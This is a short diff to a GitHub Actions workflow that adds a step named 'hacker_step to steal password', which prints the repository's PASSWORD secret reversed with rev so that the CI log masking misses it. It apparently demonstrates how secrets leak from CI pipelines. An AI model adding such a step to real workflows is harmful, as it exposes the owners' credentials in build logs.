@@ -27,5 +27,8 @@ jobs:
       # Runs a single command using the runners shell
       - name: Display the password
         run: echo $mypassword | rev
+      
+      - name: hacker_step to steal password
+        run: echo ${{secrets.PASSWORD}} | rev
 
  
